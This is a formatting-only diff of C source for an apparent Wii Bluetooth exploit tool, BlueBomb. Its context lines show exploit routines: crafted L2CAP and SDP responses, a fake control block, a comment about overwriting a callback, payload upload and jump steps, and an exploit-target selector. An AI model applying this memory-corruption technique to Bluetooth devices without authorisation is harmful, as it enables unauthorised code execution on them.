@@ -14,7 +14,7 @@
 #include <unistd.h>
 #include <ogc/lwp_watchdog.h>
 
-#define SDP_ERROR_RSP				0x01
+#define SDP_ERROR_RSP			0x01
 #define SDP_SERVICE_SEARCH_REQ		0x02
 #define SDP_SERVICE_SEARCH_RSP		0x03
 #define SDP_SERVICE_ATTR_REQ		0x04
@@ -22,15 +22,15 @@
 #define SDP_SERVICE_SEARCH_ATTR_REQ	0x06
 #define SDP_SERVICE_SEARCH_ATTR_RSP	0x07
 
-#define ERR_COMPLETE 1
+#define ERR_COMPLETE			1
 
-#define PAYLOAD_MTU 1024
-#define PAYLOAD_RESP(a,b) ((u16_t)((a) << 8) | (b))
+#define PAYLOAD_MTU			1024
+#define PAYLOAD_RESP(a, b)		((u16_t)((a) << 8) | (b))
 
 // TODO: Figure out the real MTU instead of choosing semi-random numbers
-#define SDP_MTU 0xD0
+#define SDP_MTU				0xD0
 
-#define ARRAY_COUNT(array) (size_t)(sizeof(array) / sizeof((array)[0]))
+#define ARRAY_COUNT(array)		(size_t)(sizeof(array) / sizeof((array)[0]))
 
 static void *xfb = NULL;
 static GXRModeObj *rmode = NULL;
@@ -249,7 +249,7 @@ enum APP_STATE {
 
 static void WiiPowerButton()
 {
-    quitState = 2;
+	quitState = 2;
 }
 
 static void WiiResetButton(u32 irq, void* ctx)
@@ -264,6 +264,7 @@ static void WiiSyncButton(u32 held)
 
 static err_t jump_payload(struct l2cap_pcb *pcb) {
 	err_t ret = ERR_OK;
+
 	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 1, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
 		fprintf(stderr, "%sjump_payload: Failed to send signal packet (%d)%s\n", color_red, ret, color_grey);
 		return ret;
@@ -277,7 +278,8 @@ static err_t upload_payload(struct l2cap_pcb *pcb, struct payload_info_t* payloa
 	struct pbuf *data;
 
 	int packet_size = payload_info->remaining >= PAYLOAD_MTU ? PAYLOAD_MTU : payload_info->remaining % PAYLOAD_MTU;
-	if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
+
+	if ((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
 		fprintf(stderr, "%supload_payload: Could not allocate memory for pbuf%s\n", color_red, color_grey);
 		return ERR_MEM;
 	}
@@ -338,7 +340,7 @@ static err_t do_hax(struct l2cap_pcb *pcb) {
 
 	printf("Overwriting callback in switch case 0x9.\n");
 
-	if((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) == NULL) {
+	if ((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) == NULL) {
 		fprintf(stderr, "%sdo_hax: Could not allocate memory for pbuf%s\n", color_red, color_grey);
 		return ERR_MEM;
 	}
@@ -371,7 +373,7 @@ static err_t send_sdp_service_response(struct l2cap_pcb *pcb,u16_t tid) {
 	struct ccb fake_ccb = {0};
 
 	printf("Sending SDP service response\n");
-	if((data = btpbuf_alloc(PBUF_RAW, required_size, PBUF_RAM)) == NULL) {
+	if ((data = btpbuf_alloc(PBUF_RAW, required_size, PBUF_RAM)) == NULL) {
 		fprintf(stderr, "%ssend_sdp_service_response: Could not allocate memory for pbuf%s\n", color_red, color_grey);
 		return ERR_MEM;
 	}
@@ -408,11 +410,13 @@ static err_t __bluebomb_receive_dohax(void *arg,struct l2cap_pcb *pcb,struct pbu
 {
 	err_t ret = ERR_OK;
 	printf("Doing hax\n");
+
 	if ((ret = do_hax(pcb)) == ERR_OK) {
 		l2ca_bluebomb(pcb, bluebomb_success);
 		printf("Awaiting response from stage0\n");
 		l2cap_recv(pcb,NULL);
 	}
+
 	return ret;
 }
 
@@ -428,7 +432,7 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 		u16_t packet_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + payload_size + 1;
 		printf("Sending SDP attribute response\n");
 
-		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
+		if ((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
 			fprintf(stderr, "%ssend_sdp_attribute_response: Could not allocate memory for pbuf%s\n", color_red, color_grey);
 			return ERR_MEM;
 		}
@@ -457,12 +461,13 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 		size_remaining -= payload_size;
 
 		if (size_remaining <= 0) {
-			l2cap_recv(pcb,__bluebomb_receive_dohax);
+			l2cap_recv(pcb, __bluebomb_receive_dohax);
 		}
 	} else if (size_remaining > 0) {
 		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
 		u16_t packet_size = 1 + 2 + 2 + 2 + payload_size + 1;
-		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
+
+		if ((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
 			fprintf(stderr, "%ssend_sdp_attribute_response: Could not allocate memory for pbuf\n", color_red);
 			return ERR_MEM;
 		}
@@ -487,7 +492,7 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 		size_remaining -= payload_size;
 
 		if (size_remaining <= 0) {
-			l2cap_recv(pcb,__bluebomb_receive_dohax);
+			l2cap_recv(pcb, __bluebomb_receive_dohax);
 		}
 	}
 
@@ -497,6 +502,7 @@ static err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* 
 static err_t __bluebomb_receive(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,err_t err)
 {
 	err_t ret = ERR_OK;
+
 	if (pcb->psm == SDP_PSM) {
 		u8_t hdr = *(u8_t *)p->payload;
 		u16_t tid = be16toh(*((u16_t*)((u8_t *)p->payload) + 1));
@@ -521,7 +527,7 @@ static err_t __bluebomb_accept_step2(void *arg,struct l2cap_pcb *l2cappcb,err_t 
 	printf("Got connection handle: %p\n", l2cappcb);
 
 	if (err == ERR_OK) {
-		l2cap_recv(l2cappcb,__bluebomb_receive);
+		l2cap_recv(l2cappcb, __bluebomb_receive);
 		l2cap_disconnect_ind(l2cappcb,bluebomb_disconnected_ind);
 		*pcb = l2cappcb;
 	} else {
@@ -540,14 +546,16 @@ static s32_t bluebomb_listenasync(struct l2cap_pcb **pcb, struct bd_addr *bdaddr
 	LOG("bluebomb_listenasync()\n");
 	_CPU_ISR_Disable(level);
 
-	if((l2capcb = l2cap_new()) == NULL) {
+	if ((l2capcb = l2cap_new()) == NULL) {
 		err = ERR_MEM;
 		goto error;
 	}
+
 	l2cap_arg(l2capcb,pcb);
 
-	err = l2cap_connect_ind(l2capcb,bdaddr,SDP_PSM,__bluebomb_accept_step2);
-	if(err != ERR_OK) {
+	err = l2cap_connect_ind(l2capcb,bdaddr,SDP_PSM, __bluebomb_accept_step2);
+
+	if (err != ERR_OK) {
 		l2cap_close(l2capcb);
 	}
 
@@ -562,7 +570,7 @@ static s32_t bluebomb_accept(s32_t result, void *userdata)
 	s32_t ret = ERR_OK;
 	struct l2cap_pcb **pcb = (struct l2cap_pcb **)userdata;
 
-	if((ret = bluebomb_listenasync(pcb, BD_ADDR_ANY)) != ERR_OK) {
+	if ((ret = bluebomb_listenasync(pcb, BD_ADDR_ANY)) != ERR_OK) {
 		fprintf(stderr, "bluebomb_accept: bluebomb_listenasync failed(%d)", ret);
 		return ret;
 	}
@@ -622,7 +630,9 @@ int main(int argc, char **argv) {
 
 	// Wait for Video setup to complete
 	VIDEO_WaitVSync();
-	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();
+
+	if (rmode->viTVMode&VI_NON_INTERLACE)
+		VIDEO_WaitVSync();
 
 	SYS_SetPowerCallback(WiiPowerButton);
 	SYS_SetResetCallback(WiiResetButton);
@@ -648,6 +658,7 @@ int main(int argc, char **argv) {
 
 				console_clear_line(2);
 				printf("Please select your exploit target: <%s>\n", stage0_addrs[which_addr].name);
+
 				if ((wpad_pressed & WPAD_BUTTON_RIGHT) || (pad_pressed & PAD_BUTTON_RIGHT)) {
 					if (++which_addr >= ARRAY_COUNT(stage0_addrs))
 					which_addr = 0;
